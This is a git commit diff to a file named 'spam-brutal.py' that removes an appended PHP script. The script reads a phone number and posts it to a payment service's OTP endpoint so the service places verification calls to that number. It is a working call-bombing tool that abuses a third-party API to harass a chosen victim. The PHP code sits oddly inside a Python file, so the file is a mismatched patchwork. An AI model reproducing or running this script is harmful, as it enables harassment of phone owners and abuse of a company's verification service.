646d20c3477ac5cebb1709d74e75537e8ffcd58f
D4rk4chY <53229584+D4rk4chY@users.noreply.github.com>
2019-07-28 12:52:35 +0700

    Update spam-brutal.py

--- spam-brutal.py
+++ spam-brutal.py
@@ -58,23 +58,3 @@ except:
 ''' % (P0, R0)
     os.system('xdg-open https://www.youtube.com/watch?v=FS0HrrQzDXg')
     exit()
-
-	<?php
-// Limit 3x Telpon Setiap Satu Nomor
-function send($phone){
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_HEADER, true);
-        curl_setopt($ch, CURLOPT_POST, 1);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
-        curl_close($ch);
-                echo $asw."\n";
-}
-echo "COPYRIGHT ; Dark4chy\n\n";
-echo "Nomor\nInput : ";
-$nomor = trim(fgets(STDIN));
-$execute = send($nomor);
-print $execute;
-?>
